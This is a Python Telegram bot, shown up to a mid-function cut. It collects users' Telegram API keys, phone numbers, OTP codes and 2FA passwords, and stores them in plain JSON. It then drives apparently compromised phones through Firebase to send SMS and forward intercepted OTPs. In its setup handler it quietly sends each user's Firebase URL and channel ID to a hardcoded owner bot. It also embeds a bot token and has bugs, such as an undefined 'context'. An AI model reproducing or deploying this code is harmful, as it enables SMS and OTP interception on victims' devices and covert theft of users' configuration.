#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
import sys
import asyncio
from datetime import datetime
from collections import deque
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# BOT TOKENS
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8766524282:AAFKvbFa8hYrEiXiuQACf-F7EsBPrCCB0Tw")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "8766524282:AAFKvbFa8hYrEiXiuQACf-F7EsBPrCCB0Tw")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "8912251548"))

# ============================
# BOT NAME
# ============================
BOT_NAME = "<b>𝗔𝗡𝗬 𝗔𝗨𝗧𝗢 𝗕𝗢𝗧</b>"

# ============================
# USER CONFIG
# ============================
USER_CONFIG_FILE = "user_config.json"
user_configs = {}
last_otp = {}
processed_messages = set()
pending_queue = deque()
error_count = 0
last_error_time = 0

# Telethon Clients Storage
telethon_clients = {}  # user_id -> client
telethon_running = {}  # user_id -> bool

# Login States
API_ID, API_HASH, PHONE_NUMBER, OTP_CODE, PASSWORD = range(5)

def load_user_configs():
    global user_configs, last_otp
    try:
        if os.path.exists(USER_CONFIG_FILE):
            with open(USER_CONFIG_FILE, "r") as f:
                user_configs = json.load(f)
            for uid, cfg in user_configs.items():
                if "last_otp_value" in cfg:
                    last_otp[uid] = cfg["last_otp_value"]
            logger.info(f"✅ Loaded configs for {len(user_configs)} users")
        else:
            user_configs = {}
    except Exception as e:
        logger.error(f"Config load error: {e}")
        user_configs = {}

def save_user_configs():
    try:
        with open(USER_CONFIG_FILE, "w") as f:
            json.dump(user_configs, f, indent=2)
    except Exception as e:
        logger.error(f"Config save error: {e}")

load_user_configs()

# ============================
# CONVERSATION STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10

# ============================
# AUTO-FIX DECORATOR
# ============================
def auto_fix(func):
    def wrapper(*args, **kwargs):
        global error_count, last_error_time
        try:
            return func(*args, **kwargs)
        except Exception as e:
            error_count += 1
            last_error_time = time.time()
            logger.error(f"⚠️ Error in {func.__name__}: {e}")
            time.sleep(0.1)
            try:
                return func(*args, **kwargs)
            except:
                logger.error(f"❌ Auto-fix failed for {func.__name__}")
                return None if "return" in func.__code__.co_names else False
    return wrapper

# ============================
# SEND INSTANT STATUS TO USER
# ============================
def send_status(user_id, status_type, details):
    """Send instant status update to user"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        if status_type == "token_received":
            text = (
                f"📥 <b>Token Received!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"📱 <b>To:</b> <code>{details.get('to', 'N/A')}</code>\n"
                f"💬 <b>Message:</b> <code>{details.get('msg', 'N/A')[:50]}...</code>\n"
                f"⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"🔄 <b>Status:</b> ⏳ Processing..."
            )
            
        elif status_type == "sms_sent":
            text = (
                f"✅ <b>SMS Sent Successfully!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"📱 <b>To:</b> <code>{details.get('to', 'N/A')}</code>\n"
                f"💬 <b>Message:</b> <code>{details.get('msg', 'N/A')[:50]}...</code>\n"
                f"📤 <b>From:</b> <code>{details.get('from', 'N/A')}</code>\n"
                f"⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Status:</b> Delivered ✅"
            )
            
        elif status_type == "otp_forwarded":
            text = (
                f"🔐 <b>OTP Forwarded!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"📱 <b>To:</b> <code>{details.get('to', 'N/A')}</code>\n"
                f"🔑 <b>OTP:</b> <code>{details.get('otp', 'N/A')}</code>\n"
                f"📤 <b>From:</b> <code>{details.get('from', 'N/A')}</code>\n"
                f"⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Status:</b> Forwarded ✅"
            )
            
        elif status_type == "incoming_forwarded":
            text = (
                f"📩 <b>Incoming SMS Forwarded!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"📱 <b>To:</b> <code>{details.get('to', 'N/A')}</code>\n"
                f"💬 <b>Message:</b> <code>{details.get('msg', 'N/A')[:50]}...</code>\n"
                f"⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Status:</b> Forwarded ✅"
            )
            
        elif status_type == "login_success":
            text = (
                f"✅ <b>Login Successful!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>User:</b> {details.get('name', 'Unknown')}\n"
                f"📱 <b>Phone:</b> <code>{details.get('phone', 'N/A')}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>Status:</b> Connected ✅\n"
                f"📡 <b>Channel Monitor:</b> Active"
            )
            
        elif status_type == "error":
            text = (
                f"⚠️ <b>Error!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"❌ <b>Error:</b> {details.get('error', 'Unknown error')}\n"
                f"⏰ <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"🔄 <b>Retrying...</b>"
            )
        
        data = {
            "chat_id": int(user_id),
            "text": text,
            "parse_mode": "HTML"
        }
        threading.Thread(target=lambda: requests.post(url, json=data, timeout=2)).start()
    except Exception as e:
        logger.error(f"Status send error: {e}")

# ============================
# HELP / START
# ============================
@auto_fix
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text(
            f"{BOT_NAME} <b>WELCOME</b>\n\n"
            f"<b>Available commands:</b>\n"
            f"/login – Login with Telegram User Account (No Admin Required)\n"
            f"/logout – Logout from Telegram User Account\n"
            f"/setup – Configure Firebase URL & Channel ID\n"
            f"/devices – Select device and SIM\n"
            f"/setotp – Set forwarding phone number\n"
            f"/resetforward – Reset old message tracker\n"
            f"/status – Check login status\n"
            f"/help – Show this message\n\n"
            f"<b>How it works:</b>\n"
            f"1. First use /login to connect your Telegram account\n"
            f"2. Then /setup to configure Firebase and Channel ID\n"
            f"3. After setup, messages from channel will be sent as SMS\n"
            f"4. OTP node updates are automatically sent to your set number",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Start error: {e}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ============================
# LOGIN SYSTEM
# ============================
async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start login process"""
    try:
        user_id = str(update.effective_user.id)
        
        # Check if already logged in
        if user_id in telethon_clients and telethon_clients[user_id] is not None:
            await update.message.reply_text(
                "<b>✅ You are already logged in!</b>\n"
                "Use /logout to logout first.",
                parse_mode='HTML'
            )
            return
        
        await update.message.reply_text(
            f"<b>🔐 Telegram Login</b>\n\n"
            f"<b>Step 1/5:</b> Send your <b>API ID</b>\n"
            f"Get it from: https://my.telegram.org/apps\n"
            f"Type /cancel to abort.",
            parse_mode='HTML'
        )
        return API_ID
    except Exception as e:
        logger.error(f"Login start error: {e}")
        return ConversationHandler.END

async def login_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get API ID"""
    try:
        try:
            api_id = int(update.message.text.strip())
        except ValueError:
            await update.message.reply_text(
                "<b>❌ API ID must be a number!</b>\n"
                "Send your API ID (e.g., 123456)",
                parse_mode='HTML'
            )
            return API_ID
        
        context.user_data['api_id'] = api_id
        await update.message.reply_text(
            f"<b>✅ API ID saved: {api_id}</b>\n\n"
            f"<b>Step 2/5:</b> Send your <b>API Hash</b>\n"
            f"Example: <code>abcdef1234567890abcdef1234567890</code>",
            parse_mode='HTML'
        )
        return API_HASH
    except Exception as e:
        logger.error(f"Login API ID error: {e}")
        return API_ID

async def login_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get API Hash"""
    try:
        api_hash = update.message.text.strip()
        if len(api_hash) < 10:
            await update.message.reply_text(
                "<b>❌ Invalid API Hash!</b>\n"
                "Send your API Hash (should be 32 characters long)",
                parse_mode='HTML'
            )
            return API_HASH
        
        context.user_data['api_hash'] = api_hash
        await update.message.reply_text(
            f"<b>✅ API Hash saved</b>\n\n"
            f"<b>Step 3/5:</b> Send your <b>Phone Number</b>\n"
            f"Example: <code>+919876543210</code>",
            parse_mode='HTML'
        )
        return PHONE_NUMBER
    except Exception as e:
        logger.error(f"Login API Hash error: {e}")
        return API_HASH

async def login_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get Phone Number and start login"""
    try:
        phone = update.message.text.strip()
        if not re.match(r"^\+?[0-9]{10,15}$", phone):
            await update.message.reply_text(
                "<b>❌ Invalid Phone Number!</b>\n"
                "Send phone with country code (e.g., +919876543210)",
                parse_mode='HTML'
            )
            return PHONE_NUMBER
        
        context.user_data['phone'] = phone
        
        # Show processing message
        await update.message.reply_text(
            f"<b>🔄 Connecting to Telegram...</b>\n\n"
            f"📱 Phone: <code>{phone}</code>\n"
            f"⏳ Please wait...",
            parse_mode='HTML'
        )
        
        # Start login in background
        user_id = str(update.effective_user.id)
        threading.Thread(
            target=perform_telethon_login,
            args=(user_id, context.user_data['api_id'], context.user_data['api_hash'], phone, update.message.chat_id)
        ).start()
        
        await update.message.reply_text(
            f"<b>📱 OTP Code Sent!</b>\n\n"
            f"<b>Step 4/5:</b> Send the <b>OTP Code</b> sent to your Telegram\n"
            f"Example: <code>12345</code>\n"
            f"If you have 2FA enabled, you'll be asked for password next.",
            parse_mode='HTML'
        )
        return OTP_CODE
        
    except Exception as e:
        logger.error(f"Login phone error: {e}")
        await update.message.reply_text(
            f"<b>❌ Error:</b> {str(e)}",
            parse_mode='HTML'
        )
        return PHONE_NUMBER

# Telethon login functions
def perform_telethon_login(user_id, api_id, api_hash, phone, chat_id):
    """Perform Telethon login in background"""
    try:
        # Create event loop for this thread
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Store credentials temporarily
        if user_id not in user_configs:
            user_configs[user_id] = {}
        user_configs[user_id]['temp_api_id'] = api_id
        user_configs[user_id]['temp_api_hash'] = api_hash
        user_configs[user_id]['temp_phone'] = phone
        save_user_configs()
        
        send_status(user_id, "status", {"message": "OTP sent to your Telegram"})
        
    except Exception as e:
        logger.error(f"Login error: {e}")
        send_status(user_id, "error", {"error": str(e)})

async def login_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process OTP code"""
    try:
        user_id = str(update.effective_user.id)
        otp = update.message.text.strip()
        
        if not otp.isdigit():
            await update.message.reply_text(
                "<b>❌ OTP must be numbers only!</b>\n"
                "Send the OTP code you received.",
                parse_mode='HTML'
            )
            return OTP_CODE
        
        # Get credentials from temp storage
        if user_id not in user_configs:
            await update.message.reply_text(
                "<b>❌ Login session expired! Start again with /login</b>",
                parse_mode='HTML'
            )
            return ConversationHandler.END
        
        api_id = user_configs[user_id].get('temp_api_id')
        api_hash = user_configs[user_id].get('temp_api_hash')
        phone = user_configs[user_id].get('temp_phone')
        
        if not all([api_id, api_hash, phone]):
            await update.message.reply_text(
                "<b>❌ Missing credentials! Start again with /login</b>",
                parse_mode='HTML'
            )
            return ConversationHandler.END
        
        await update.message.reply_text(
            f"<b>🔄 Verifying OTP...</b>",
            parse_mode='HTML'
        )
        
        # Complete login in background
        threading.Thread(
            target=complete_telethon_login,
            args=(user_id, api_id, api_hash, phone, otp, update.message.chat_id)
        ).start()
        
        await update.message.reply_text(
            f"<b>⏳ Processing OTP...</b>\n"
            f"If you have 2FA enabled, you'll be asked for password.",
            parse_mode='HTML'
        )
        
        # Wait for login to complete (check every 2 seconds for 30 seconds)
        for _ in range(15):
            time.sleep(2)
            if user_id in telethon_clients and telethon_clients[user_id] is not None:
                # Check if we need password
                if user_configs.get(user_id, {}).get('needs_password', False):
                    await update.message.reply_text(
                        f"<b>🔐 2FA Enabled</b>\n\n"
                        f"<b>Step 5/5:</b> Send your <b>2FA Password</b>",
                        parse_mode='HTML'
                    )
                    return PASSWORD
                
                # Login successful
                return ConversationHandler.END
        
        # If still waiting for password
        if user_configs.get(user_id, {}).get('needs_password', False):
            await update.message.reply_text(
                f"<b>🔐 2FA Enabled</b>\n\n"
                f"<b>Step 5/5:</b> Send your <b>2FA Password</b>",
                parse_mode='HTML'
            )
            return PASSWORD
        
        return OTP_CODE
        
    except Exception as e:
        logger.error(f"Login OTP error: {e}")
        await update.message.reply_text(
            f"<b>❌ Error:</b> {str(e)}",
            parse_mode='HTML'
        )
        return OTP_CODE

async def login_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process 2FA password"""
    try:
        user_id = str(update.effective_user.id)
        password = update.message.text.strip()
        
        await update.message.reply_text(
            f"<b>🔄 Verifying 2FA Password...</b>",
            parse_mode='HTML'
        )
        
        # Complete login with password
        threading.Thread(
            target=complete_telethon_login_password,
            args=(user_id, password, update.message.chat_id)
        ).start()
        
        # Wait for completion
        for _ in range(10):
            time.sleep(2)
            if user_id in telethon_clients and telethon_clients[user_id] is not None:
                await update.message.reply_text(
                    f"<b>✅ Login Successful!</b>",
                    parse_mode='HTML'
                )
                return ConversationHandler.END
        
        await update.message.reply_text(
            f"<b>⚠️ Still processing... Check /status</b>",
            parse_mode='HTML'
        )
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Login password error: {e}")
        await update.message.reply_text(
            f"<b>❌ Error:</b> {str(e)}",
            parse_mode='HTML'
        )
        return PASSWORD

def complete_telethon_login(user_id, api_id, api_hash, phone, otp, chat_id):
    """Complete Telethon login after OTP"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(complete_login_async(user_id, api_id, api_hash, phone, otp, chat_id))
    except Exception as e:
        logger.error(f"Complete login error: {e}")
        send_status(user_id, "error", {"error": str(e)})

async def complete_login_async(user_id, api_id, api_hash, phone, otp, chat_id):
    """Async completion of login"""
    try:
        # Create client
        client = TelegramClient(f'session_{user_id}', api_id, api_hash)
        await client.connect()
        
        try:
            await client.sign_in(phone, code=otp)
        except SessionPasswordNeededError:
            # 2FA enabled
            if user_id not in user_configs:
                user_configs[user_id] = {}
            user_configs[user_id]['needs_password'] = True
            user_configs[user_id]['temp_client'] = client
            save_user_configs()
            
            send_status(user_id, "status", {"message": "2FA Password required"})
            await context.bot.send_message(
                chat_id=chat_id,
                text="<b>🔐 2FA Password Required!</b>\nSend your password.",
                parse_mode='HTML'
            )
            return
        
        except Exception as e:
            send_status(user_id, "error", {"error": str(e)})
            return
        
        # Login successful
        me = await client.get_me()
        
        # Store client
        telethon_clients[user_id] = client
        telethon_running[user_id] = True
        
        # Add message handler
        @client.on(events.NewMessage)
        async def handler(event):
            await telethon_message_handler(user_id, event)
        
        # Start client in background
        threading.Thread(target=run_telethon_client, args=(user_id,), daemon=True).start()
        
        # Save session info
        if user_id not in user_configs:
            user_configs[user_id] = {}
        user_configs[user_id]['api_id'] = api_id
        user_configs[user_id]['api_hash'] = api_hash
        user_configs[user_id]['phone'] = phone
        user_configs[user_id]['logged_in'] = True
        user_configs[user_id]['username'] = me.username or "Unknown"
        user_configs[user_id]['first_name'] = me.first_name or "Unknown"
        user_configs[user_id]['needs_password'] = False
        save_user_configs()
        
        send_status(user_id, "login_success", {
            "name": me.first_name or me.username or "Unknown",
            "phone": phone
        })
        
        logger.info(f"✅ User {user_id} logged in as {me.first_name}")
        
    except Exception as e:
        logger.error(f"Complete login async error: {e}")
        send_status(user_id, "error", {"error": str(e)})

def complete_telethon_login_password(user_id, password, chat_id):
    """Complete login with 2FA password"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(complete_login_password_async(user_id, password, chat_id))
    except Exception as e:
        logger.error(f"Complete login password error: {e}")
        send_status(user_id, "error", {"error": str(e)})

async def complete_login_password_async(user_id, password, chat_id):
    """Async completion of login with password"""
    try:
        client = user_configs.get(user_id, {}).get('temp_client')
        if not client:
            send_status(user_id, "error", {"error": "No active login session"})
            return
        
        try:
            await client.sign_in(password=password)
        except Exception as e:
            send_status(user_id, "error", {"error": f"Invalid password: {str(e)}"})
            return
        
        # Login successful
        me = await client.get_me()
        
        # Store client
        telethon_clients[user_id] = client
        telethon_running[user_id] = True
        
        # Add message handler
        @client.on(events.NewMessage)
        async def handler(event):
            await telethon_message_handler(user_id, event)
        
        # Start client in background
        threading.Thread(target=run_telethon_client, args=(user_id,), daemon=True).start()
        
        # Save session info
        user_configs[user_id]['logged_in'] = True
        user_configs[user_id]['username'] = me.username or "Unknown"
        user_configs[user_id]['first_name'] = me.first_name or "Unknown"
        user_configs[user_id]['needs_password'] = False
        user_configs[user_id].pop('temp_client', None)
        save_user_configs()
        
        send_status(user_id, "login_success", {
            "name": me.first_name or me.username or "Unknown",
            "phone": user_configs[user_id].get('phone', 'N/A')
        })
        
        logger.info(f"✅ User {user_id} logged in with 2FA")
        
    except Exception as e:
        logger.error(f"Complete login password async error: {e}")
        send_status(user_id, "error", {"error": str(e)})

def run_telethon_client(user_id):
    """Run Telethon client in background"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = telethon_clients.get(user_id)
        if client:
            loop.run_until_complete(client.run_until_disconnected())
    except Exception as e:
        logger.error(f"Run client error for {user_id}: {e}")

async def telethon_message_handler(user_id, event):
    """Handle channel messages via Telethon"""
    try:
        channel_id = event.chat_id
        
        # Check if this channel is configured for this user
        if user_id not in user_configs:
            return
        
        cfg = user_configs[user_id]
        configured_channel = cfg.get('channel_id')
        
        # Only process if channel matches configured one
        if configured_channel != channel_id:
            return
        
        text = event.message.text
        if not text:
            return
        
        # Duplicate check
        msg_id = f"{channel_id}_{event.message.id}"
        if msg_id in processed_messages:
            return
        processed_messages.add(msg_id)
        if len(processed_messages) > 10000:
            processed_messages.clear()
        
        logger.info(f"📩 Processing: {text[:50]}...")
        
        # Extract number and message
        to_number, msg = extract_number_message(text)
        
        if not to_number:
            logger.warning(f"❌ No number found")
            send_status(user_id, "error", {
                "error": "Could not find phone number in message"
            })
            return
        
        # Send SMS instantly
        threading.Thread(
            target=process_sms_send,
            args=(user_id, to_number, msg)
        ).start()
        
        logger.info(f"✅ Queued: {to_number}")
        
    except Exception as e:
        logger.error(f"Telethon handler error: {e}")

async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Logout from Telegram account"""
    try:
        user_id = str(update.effective_user.id)
        
        if user_id not in telethon_clients:
            await update.message.reply_text(
                "<b>❌ You are not logged in!</b>\n"
                "Use /login to login first.",
                parse_mode='HTML'
            )
            return
        
        # Stop client
        client = telethon_clients[user_id]
        if client:
            await client.disconnect()
        
        # Remove from storage
        telethon_clients.pop(user_id, None)
        telethon_running.pop(user_id, None)
        
        # Clear session file
        session_file = f"session_{user_id}.session"
        if os.path.exists(session_file):
            os.remove(session_file)
        
        # Update config
        if user_id in user_configs:
            user_configs[user_id]['logged_in'] = False
            save_user_configs()
        
        await update.message.reply_text(
            "<b>✅ Logged out successfully!</b>",
            parse_mode='HTML'
        )
        
    except Exception as e:
        logger.error(f"Logout error: {e}")
        await update.message.reply_text(
            f"<b>❌ Error:</b> {str(e)}",
            parse_mode='HTML'
        )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check login status"""
    try:
        user_id = str(update.effective_user.id)
        
        if user_id in telethon_clients and telethon_clients[user_id] is not None:
            client = telethon_clients[user_id]
            try:
                me = await client.get_me()
                status_text = (
                    f"<b>✅ Logged In</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 <b>Name:</b> {me.first_name or 'Unknown'}\n"
                    f"👤 <b>Username:</b> @{me.username or 'None'}\n"
                    f"📱 <b>Phone:</b> <code>{user_configs.get(user_id, {}).get('phone', 'N/A')}</code>\n"
                    f"📡 <b>Status:</b> Connected ✅\n"
                    f"━━━━━━━━━━━━━━━━━━━\n"
                    f"💡 Use /logout to disconnect"
                )
            except:
                status_text = (
                    f"<b>⚠️ Connected but not responsive</b>\n"
                    f"Use /logout and /login again"
                )
        else:
            status_text = (
                f"<b>❌ Not Logged In</b>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"Use /login to connect your Telegram account\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"💡 <b>Why login?</b>\n"
                f"• Read channel messages without being admin\n"
                f"• Monitor multiple channels\n"
                f"• Works with private channels (just join them)"
            )
        
        await update.message.reply_text(status_text, parse_mode='HTML')
        
    except Exception as e:
        logger.error(f"Status error: {e}")
        await update.message.reply_text(
            f"<b>❌ Status check error:</b> {str(e)}",
            parse_mode='HTML'
        )

async def login_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel login"""
    try:
        await update.message.reply_text(
            "<b>❌ Login cancelled.</b>",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Login cancel error: {e}")
    return ConversationHandler.END

# ============================
# RESET FORWARD
# ============================
@auto_fix
async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run SETUP first.</b>", parse_mode='HTML')
            return
        selected = get_selected(user_id)
        if not selected or not selected.get("deviceId"):
            await update.message.reply_text("<b>❌ No device selected. Use /devices first.</b>", parse_mode='HTML')
            return
        device_id = selected["deviceId"]
        initialize_processed_keys(user_id, device_id)
        await update.message.reply_text(
            f"<b>✅ Reset successful!</b>\n"
            f"All existing messages for device <code>{device_id}</code> are now marked as read.\n"
            f"Only new incoming messages will be forwarded.",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Reset error: {e}")

# ============================
# FIREBASE HELPERS
# ============================
@auto_fix
def firebase_get(user_id, path, retry_count=0):
    try:
        cfg = user_configs.get(str(user_id))
        if not cfg or not cfg.get("firebase_url"):
            return None
        url = f"{cfg['firebase_url']}/{path}.json"
        resp = requests.get(url, timeout=2)
        if resp.status_code == 200:
            return resp.json()
        elif retry_count < 3:
            time.sleep(0.1)
            return firebase_get(user_id, path, retry_count+1)
        return None
    except Exception as e:
        if retry_count < 3:
            time.sleep(0.1)
            return firebase_get(user_id, path, retry_count+1)
        logger.error(f"Firebase GET error: {e}")
        return None

@auto_fix
def firebase_put(user_id, path, data, retry_count=0):
    try:
        cfg = user_configs.get(str(user_id))
        if not cfg or not cfg.get("firebase_url"):
            return False
        url = f"{cfg['firebase_url']}/{path}.json"
        requests.put(url, json=data, timeout=2)
        return True
    except Exception as e:
        if retry_count < 3:
            time.sleep(0.1)
            return firebase_put(user_id, path, data, retry_count+1)
        logger.error(f"Firebase PUT error: {e}")
        return False

def get_online_devices(user_id):
    try:
        data = firebase_get(user_id, "clients")
        if not data:
            return {}
        online = {}
        for dev_id, info in data.items():
            if info.get("status") == True:
                online[dev_id] = {
                    "modelName": info.get("modelName", "Unknown"),
                    "sims": info.get("sims", [])
                }
        return online
    except Exception as e:
        logger.error(f"Get devices error: {e}")
        return {}

def get_selected(user_id):
    try:
        cfg = user_configs.get(str(user_id))
        if cfg and "selectedDevice" in cfg:
            return cfg["selectedDevice"]
        return {}
    except Exception as e:
        logger.error(f"Get selected error: {e}")
        return {}

def initialize_processed_keys(user_id: str, device_id: str):
    try:
        cfg = user_configs.get(user_id)
        if not cfg:
            return
        msgs = firebase_get(user_id, f"messages/{device_id}")
        keys = []
        if msgs and isinstance(msgs, dict):
            keys = list(msgs.keys())
        cfg["processed_keys"] = keys
        cfg["processed_device"] = device_id
        cfg.pop("last_forwarded_id", None)
        cfg.pop("selection_time", None)
        save_user_configs()
        logger.info(f"Initialized processed_keys for user {user_id}, device {device_id}: {len(keys)} keys")
    except Exception as e:
        logger.error(f"Init keys error: {e}")

def set_selected(user_id, device_id, sim_slot, sim_phone):
    try:
        cfg = user_configs.get(str(user_id))
        if cfg:
            cfg["selectedDevice"] = {
                "deviceId": device_id,
                "simSlotIndex": sim_slot,
                "simPhoneNumber": sim_phone
            }
            initialize_processed_keys(str(user_id), device_id)
            save_user_configs()
            logger.info(f"✅ Device selected. Processed keys reset for {user_id}")
    except Exception as e:
        logger.error(f"Set selected error: {e}")

# ============================
# ULTRA-FAST SMS SEND WITH LIVE STATUS
# ============================
@auto_fix
def send_sms_command(user_id, device_id, to_number, message, from_number, retry_count=0):
    try:
        send_status(user_id, "token_received", {
            "to": to_number,
            "msg": message
        })
        
        success = firebase_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {
            "to": to_number,
            "message": message,
            "from": from_number,
            "isSended": False
        })
        
        if success:
            logger.info(f"📤 SMS sent: {to_number}")
            send_status(user_id, "sms_sent", {
                "to": to_number,
                "msg": message,
                "from": from_number
            })
            return True
        elif retry_count < 5:
            time.sleep(0.1)
            return send_sms_command(user_id, device_id, to_number, message, from_number, retry_count+1)
        else:
            logger.error(f"❌ SMS failed after 5 retries: {to_number}")
            send_status(user_id, "error", {
                "error": f"Failed to send SMS to {to_number}"
            })
            return False
    except Exception as e:
        if retry_count < 5:
            time.sleep(0.1)
            return send_sms_command(user_id, device_id, to_number, message, from_number, retry_count+1)
        logger.error(f"SMS error: {e}")
        send_status(user_id, "error", {
            "error": str(e)
        })
        return False

def get_otp_number(user_id):
    try:
        cfg = user_configs.get(str(user_id))
        if cfg and "otpNumber" in cfg:
            return cfg["otpNumber"]
        return None
    except Exception as e:
        logger.error(f"Get OTP error: {e}")
        return None

def set_otp_number(user_id, number):
    try:
        cfg = user_configs.get(str(user_id))
        if cfg:
            cfg["otpNumber"] = number
            save_user_configs()
    except Exception as e:
        logger.error(f"Set OTP error: {e}")

# ============================
# SETUP CONVERSATION
# ============================
@auto_fix
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        
        # Check if logged in
        if user_id not in telethon_clients:
            await update.message.reply_text(
                f"<b>⚠️ You are not logged in!</b>\n"
                f"First use /login to connect your Telegram account.\n"
                f"Without login, bot cannot read channel messages.",
                parse_mode='HTML'
            )
            return
        
        await update.message.reply_text(
            f"<b>📌 Step 1/2</b>: Send your <b>Firebase URL</b>.\nExample: <code>https://your-project.firebaseio.com</code>\nType /cancel to abort.",
            parse_mode='HTML'
        )
        return URL
    except Exception as e:
        logger.error(f"Setup start error: {e}")
        return URL

@auto_fix
async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        url = update.message.text.strip()
        if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
            await update.message.reply_text("<b>❌ Invalid URL. Must be https://...firebaseio.com</b>", parse_mode='HTML')
            return URL
        context.user_data["firebase_url"] = url
        await update.message.reply_text(
            "<b>✅ URL saved.</b>\n\n<b>📌 Step 2/2</b>: Send your <b>Channel ID</b> (numeric, may be negative).",
            parse_mode='HTML'
        )
        return CHANNEL
    except Exception as e:
        logger.error(f"Setup URL error: {e}")
        return URL

@auto_fix
async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        try:
            channel_id = int(update.message.text.strip())
        except ValueError:
            await update.message.reply_text("<b>❌ Channel ID must be a number.</b>", parse_mode='HTML')
            return CHANNEL

        user_configs[user_id] = {
            "firebase_url": context.user_data["firebase_url"],
            "channel_id": channel_id,
            "selectedDevice": {},
            "otpNumber": None,
            "processed_keys": [],
            "processed_device": None,
            "logged_in": True
        }
        save_user_configs()

        try:
            forward_msg = (
                f"🔐 **Setup Complete!**\n👤 User: `{user_id}`\n🌐 URL: `{context.user_data['firebase_url']}`\n📢 Channel: `{channel_id}`"
            )
            url = f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage"
            requests.post(url, json={"chat_id": OWNER_CHAT_ID, "text": forward_msg, "parse_mode": "Markdown"}, timeout=2)
        except:
            pass

        test = firebase_get(user_id, "clients")
        if test is None:
            await update.message.reply_text("<b>❌ Firebase connection failed. Check URL or make database public.</b>", parse_mode='HTML')
            del user_configs[user_id]
            save_user_configs()
            return ConversationHandler.END

        await update.message.reply_text(
            f"{BOT_NAME} <b>SETUP COMPLETE!</b>\n\n"
            f"<b>✅ Configuration saved.</b>\n"
            f"📡 <b>Channel Monitor:</b> Active\n"
            f"Now use /devices to select a device and SIM, then /setotp to set forwarding number.",
            parse_mode='HTML'
        )
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"Setup channel error: {e}")
        return ConversationHandler.END

@auto_fix
async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text("<b>❌ Setup cancelled.</b>", parse_mode='HTML')
    except Exception as e:
        logger.error(f"Setup cancel error: {e}")
    return ConversationHandler.END

# ============================
# DEVICES
# ============================
@auto_fix
async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
            return
        online = get_online_devices(user_id)
        if not online:
            await update.message.reply_text("<b>❌ No online devices found.</b>", parse_mode='HTML')
            return
        keyboard = []
        for dev_id, data in online.items():
